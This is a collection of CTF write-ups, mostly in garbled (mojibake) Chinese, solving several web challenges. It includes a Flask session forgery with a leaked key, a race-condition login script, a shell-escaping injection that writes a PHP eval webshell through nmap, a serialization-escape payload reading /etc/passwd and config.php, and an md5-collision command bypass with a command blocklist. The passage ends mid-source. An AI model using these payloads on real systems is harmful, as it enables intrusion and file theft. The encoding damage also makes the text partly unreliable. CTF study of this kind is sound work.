2019]æ¯ç‡¥çš„æŠ½å¥–writeupæˆ‘TMå¿ƒæ€å´©äº†å•Šï¼ŒåŒä¸€ä¸ªsessionåº”è¯¥ç”Ÿæˆçš„éšæœºæ•°ä¸€æ ·å•Šï¼Œè¯•äº†å¥½ä¹…ï¼Œéƒ½å¿«å“­äº† æºç å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®check.php 12345678910111213141516171819202122232425262728 &lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123; if($_POST[&#x27;num&#x27;]===$str)&#123;x echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;; &#125;&#125;show_source(&quot;check.php&quot;); çŸ¥é“å‰10ä½äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨php_mt_seedå¤šä¸ªå‚æ•°çˆ†ç ´ç§å­ 1234s=&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;pwd=&quot;Mu7S5Y076i&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 &quot;,end=&quot;&quot;) æ‰¾åˆ°ç§å­ï¼Œæ³¨æ„ç‰ˆæœ¬ï¼Œåªéœ€ç”¨åŸæ¥çš„åŠ å¯†æ–¹å¼å°±è¡Œ 1234567891011&lt;?phpshow_source(__FILE__);mt_srand(666994457);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str.&quot;&lt;/p&gt;&quot;; æäº¤å³å¯å¾—flag [HCTF 2018]adminwriteupå‚è€ƒï¼šhttps://www.anquanke.com/post/id/164086 æ‰“å¼€æ³¨å†Œç™»é™†ï¼Œåœ¨indexé¡µé¢çœ‹åˆ°you are not adminï¼Œåœ¨change passwordé¡µé¢æºä»£ç é‡Œçœ‹åˆ°æœ‰ä¸ªgithubåœ°å€ 1https://github.com/woadsl1234/hctf_flask/ ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå‘ç°æ˜¯python2çš„flaské¡¹ç›®ï¼Œåœ¨templates/index.htmlçœ‹åˆ° 123&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;&#123;% endif %&#125; ç™»é™†adminå³å¯å¾—åˆ°flag routes.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥ buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­ session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username åœ¨config.pyçœ‹åˆ°secret_key,å¯ä»¥è€ƒè™‘sessionä¼ªé€  1234class Config(object): SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27; SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27; SQLALCHEMY_TRACK_MODIFICATIONS = True flask sessionåŠ å¯†è§£å¯†å·¥å…·githubåœ°å€ï¼šhttps://github.com/noraj/flask-session-cookie-manager 1234python flask_session_manager.py decode -c -s # -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEYpython flask_session_manager.py encode -s -t # -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°sessionè§£å¯†åçš„æ ¼å¼ æ›¿æ¢å°±å¯ä»¥å¾—åˆ°flagï¼Œå…¶å®å¯ä»¥ä¸ç”¨è¿™ä¹ˆé•¿çš„sessionï¼Œç›´æ¥ä¸‹é¢è¿™æ ·ä¹Ÿè¡Œ 1python flask_session_cookie_manager2.py encode -s ckj123 -t &quot;&#123;u&#x27;user_id&#x27;: u&#x27;10&#x27;, u&#x27;name&#x27;: u&#x27;admin&#x27;&#125;&quot; è¿™é¢˜è¿˜å¯ä»¥ç”¨unicodeæ¬ºéª—ï¼Œä¸éš¾å‘ç°ç™»é™†æ³¨å†Œé¡µé¢å¯¹session[&#39;name&#39;]çš„æ“ä½œéƒ½è¿›è¡Œäº†strlowerå‡½æ•°çš„æ“ä½œ,è€Œstrloweråˆå¦‚ä¸‹è°ƒç”¨äº† 12345from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepdef strlower(username): username = nodeprep.prepare(username) return username åœ¨requirements.txtçœ‹åˆ°twistedçš„ç‰ˆæœ¬æ˜¯10.2.0ï¼Œç›®å‰ç‰ˆæœ¬éƒ½20.3.0äº†ï¼Œåˆšå¥½è¯¥ç‰ˆæœ¬å­˜åœ¨æ¼æ´ nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦á´¬è½¬æ¢æˆAï¼Œè€ŒAåœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠAè½¬æ¢æˆa æ‰€ä»¥æˆ‘ä»¬æ³¨å†Œá´¬dminæ­¤æ—¶è°ƒç”¨ä¸€æ¬¡å˜æˆAdminï¼Œå†ä¿®æ”¹ä¸€æ¬¡å¯†ç å°±èƒ½å†è°ƒç”¨ä¸€æ¬¡å˜æˆadmin,æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿèƒ½getflag è¿™é¢˜è¿˜èƒ½ç”¨æ¡ä»¶ç«äº‰çš„æ–¹æ³• 12345678910111213def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = namedef change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) å¯ä»¥çœ‹åˆ°è¿™ç™»é™†å’Œæ”¹å¯†ç æ“ä½œåœ¨æ²¡æœ‰å®Œå…¨checkèº«ä»½çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œäº†sessionæœ‰å…³çš„èµ‹å€¼ å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰çš„æ–¹æ³•ï¼Œä¸€ä¸ªæ”¹å¯†ç ï¼Œä¸€ä¸ªé€€å‡ºç™»é™†å¹¶ä»¥adminç™»é™†ï¼Œexp: 1234567891011121314151617181920212223242526272829303132333435import requestsimport threadingdef login(s, username, password): data = &#123; &#x27;username&#x27;: username, &#x27;password&#x27;: password, &#x27;submit&#x27;: &#x27;&#x27; &#125; return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)def logout(s): return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)def change(s, newpassword): data = &#123; &#x27;newpassword&#x27;:newpassword &#125; return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)def func1(s): login(s, &#x27;skysec&#x27;, &#x27;skysec&#x27;) change(s, &#x27;skysec&#x27;)def func2(s): logout(s) res = login(s, &#x27;admin&#x27;, &#x27;skysec&#x27;) if &#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27; in res.text: print(&#x27;finish&#x27;)def main(): for i in range(1000): print(i) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() [De1CTF 2019]SSRF Mewriteupæ‰“å¼€å‘ç°æœ‰æºç ,æ•´ç†ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import jsonreload(sys) sys.setdefaultencoding(&#x27;latin1&#x27;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#x27;/&#x27;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80) [BUUCTF 2018]Online Toolwriteupè®¿é—®å¾—åˆ°æºç ï¼š 1234567891011121314151617&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; escapeshellargå‡½æ•°: escapeshellcmdå‡½æ•°ï¼š è¿™ä¸¤ä¸ªå‡½æ•°æœ¬èº«æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœæ”¾åœ¨ä¸€èµ·ç”¨ï¼Œå°±å¯èƒ½é€ æˆæ¼æ´ å‡è®¾æˆ‘ä»¬ä¼ å…¥?host=127.0.0.1&#39;ï¼Œä»¥linuxä¸ºä¾‹(Windowsä¼šä¸åŒ)ï¼Œæœªå¤„ç†å‰ 1127.0.0.1&#x27; ç»è¿‡escapeshellargå‡½æ•°ï¼Œå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ï¼š 1&#x27;127.0.0.1&#x27;\\&#x27;&#x27;&#x27; ç»è¿‡escapeshellcmdå‡½æ•°ï¼Œ\\ä¼šè¢«è½¬ä¹‰ï¼Œæœ€åä¸€ä¸ª&#39;ç”±äºä¸åŒ¹é…ä¹Ÿè¢«è½¬ä¹‰ï¼š 1&#x27;127.0.0.1&#x27;\\\\&#x27;&#x27;\\&#x27; æ­¤æ—¶æ‰§è¡Œçš„å°±æ˜¯ 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;127.0.0.1&#x27;\\\\&#x27;&#x27;\\&#x27; ç›¸å½“äº,æˆå¯¹çš„&#39;å¯ä»¥å»æ‰æ‰ï¼Œ\\\\è½¬ä¹‰æˆ\\ï¼Œ\\&#39;è½¬ä¹‰æˆ&#39;ï¼Œæœ€ç»ˆï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F 127.0.0.1\\&#x27; æˆ‘ä»¬æ„é€  1?host=&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27; æœ€ç»ˆæ‰§è¡Œçš„å°±æ˜¯ 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27;\\\\&#x27;&#x27;&#x27; å¯ä»¥çœ‹åˆ°ï¼Œç”±äºç©ºæ ¼çš„å­˜åœ¨nmapæŠŠåé¢çš„éƒ½å½“ä½œæ˜¯ä¸€ä¸ªä¸ªåŸŸåäº†ï¼Œå¹¶æˆåŠŸçš„å†™å…¥shell æˆ‘ä»¬å†çœ‹ä¸€ä¸‹å…¶ä»–çš„æƒ…å†µï¼š åªç”¨escapeshellargå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27; åªç”¨escapeshellcmdå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27; å…ˆç”¨escapeshellcmdå‡½æ•°åç”¨escapeshellargå‡½æ•°ï¼Œæ‰§è¡Œçš„å‘½ä»¤ï¼š 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27; è¿™ä¸‰ç§å¥½åƒéƒ½æ— æ³•æ³¨å…¥å‘½ä»¤ [0CTF 2016]piapiapiawriteupæ‰«ç›®å½•å‘ç°www.zipï¼Œåœ¨class.phpçœ‹åˆ°è¿‡æ»¤å‡½æ•°ï¼Œè¾“å…¥å·²ç»ä¸å¯èƒ½äº† æ‰¾äº†æ‰¾å‘ç°profile.phpä¸­æœ‰ä¸ªæ•æ„Ÿå‡½æ•° åˆ†æä¸€ä¸‹ä»£ç æµç¨‹ï¼Œç”¨æˆ·ç™»é™†é¦–å…ˆè¿›å…¥userç±»é‡Œçš„login()æ–¹æ³•ï¼Œåœ¨é‡Œé¢ç»è¿‡çˆ¶ç±»(mysql)filteræ–¹æ³•çš„è¿‡æ»¤ï¼Œè°ƒç”¨çˆ¶ç±»çš„select()æ–¹æ³•,æ¥ç€åˆ¤æ–­md5å€¼æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›trueï¼Œå¹¶æŠŠusernameå­˜åˆ°sessioné‡Œ å†çœ‹çœ‹update.phpï¼Œè™½ç„¶æœ‰ä¸Šä¼ ä½†æ˜¯æ²¡æ³•è§£ææˆphpï¼ŒæŠŠå¡«çš„ä¿¡æ¯åºåˆ—åŒ–å­˜åˆ°æ•°æ®åº“é‡Œ æ¥ç€å†çœ‹profile.phpè¿™é‡Œè°ƒç”¨äº†userç±»çš„show_profile()æ–¹æ³•ï¼ŒåŒæ ·ç»è¿‡è¿‡æ»¤è°ƒç”¨çˆ¶ç±»çš„selectæ–¹æ³•ï¼ŒæŠŠæŸ¥è¯¢ç»“æœååºåˆ—åŒ– ç”±äºfilterè¿›è¡Œäº†æ›¿æ¢ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œçœ‹ä¸‹æ€æœ«æ›¿æ¢çš„ 12345678910 public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125;# æŠŠ&#x27; \\\\ æ›¿æ¢æˆ _ é•¿åº¦å‡ä¸€# æŠŠselect insert update delete where æ›¿æ¢æˆhacker whereæ—¶é•¿åº¦åŠ ä¸€ æ­£å¸¸åºåˆ—åŒ–ï¼š 123456&lt;?php$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1111111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] = &#x27;aaaa&#x27;;$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27;.md5(&#x27;str&#x27;);echo serialize($profile); ç»“æœï¼š 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:17:&quot;1111111111@qq.com&quot;;s:8:&quot;nickname&quot;;s:4:&quot;aaaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/341be97d9aff90c9978347f66f945b77&quot;;&#125; æˆ‘ä»¬å‘ç°æœ€åä¸€ä¸ªä¸å¯æ§photoï¼Œè€Œemailå’Œnicknameå¯æ§ï¼Œä½†æœ‰é•¿åº¦é™åˆ¶ï¼Œå¾ˆæ˜æ˜¾ç›´æ¥è¿™æ ·æ˜¯é€ƒé€¸ä¸å‡ºå»çš„ 123456if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;);if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;);if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); ä»”ç»†çœ‹ä¸‹ï¼Œæœ€åä¸€ä¸ªåŒ¹é…å’Œå‰é¢ä¿©ä¸ä¸€æ ·ï¼Œè¡¨ç¤ºåªè¦æ˜¯éå­—æ¯æ•°å­—ä¸‹åˆ’çº¿éƒ½è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æ•°ç»„ç»•è¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸¤ä¸ªå‡½æ•°éƒ½ä¼šè¿”å›false è¿™æ ·åºåˆ—åŒ–è¿‡ç¨‹ï¼š 123456&lt;?php$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1111111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] []= &#x27;aaaa&#x27;;$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27;.md5(&#x27;str&#x27;);echo serialize($profile); ç»“æœï¼š 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:17:&quot;1111111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;aaaa&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/341be97d9aff90c9978347f66f945b77&quot;;&#125; æ¥ç€æˆ‘ä»¬å°±å¯ä»¥æ— é™åˆ¶çš„å¡«å……nicknameäº†,è®©å®ƒæº¢å‡ºé€ƒé€¸å‡ºå» æˆ‘ä»¬éœ€è¦æ·»åŠ çš„å†…å®¹,é•¿åº¦m=35 1&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125; åˆ—æ–¹ç¨‹ 15n+y+m&#x3D;6n+y å¾—n=35,å³æˆ‘ä»¬éœ€è¦35ä¸ªwhereï¼Œæ„é€  æ³¨æ„æ•°ç»„çš„æ„é€ ï¼Œç„¶åå°±èƒ½å¾—åˆ°è¯»å–æ–‡ä»¶base64çš„å€¼ è¯•ç€å»è¯»config.php,éœ€è¦æ·»åŠ çš„å†…å®¹ 1&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; é•¿åº¦ä¸º34ï¼Œæ•…æ„é€ 34ä¸ªwhereï¼Œé‡æ–°æ³¨å†Œä¸ªè´¦å·å°±å¯ä»¥äº† é•¿åº¦å‡å°(\\\\æ›¿æ¢æˆ_)çš„æ–¹æ³•æ²¡æ³•ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬åé¢æ²¡å¯æ§çš„å­—ç¬¦ [å®‰æ´µæ¯ 2019]easy_webwriteupæ‰“å¼€å‘ç°æœ‰imgå‚æ•°ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ–‡ä»¶åŒ…å«ï¼Œä¸¤æ¬¡base64è§£å¯†å16è¿›åˆ¶è½¬asciiå¾—åˆ°555.png å°è¯•/etc/passwdå‘ç°ä¸è¡Œï¼Œçœ‹äº†ä¸‹æºç å‘ç°æŠŠé™¤å­—æ¯æ•°å­—ç‚¹å·å­—ç¬¦éƒ½æ›¿æ¢ä¸ºç©ºäº†ï¼Œæ€è·¯è¦å¤šç‚¹ï¼Œä¸èƒ½å±€é™ä¸€ç§ ç›´æ¥è¯»index.php 1?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D; base64è§£å¯†å¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; md5é‚£é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨MD5ç¢°æ’ï¼Œå‘½ä»¤æ‰§è¡Œæˆ‘ä»¬å¯ä»¥ca\\t /fl\\agç»•è¿‡ [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzwriteupæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; 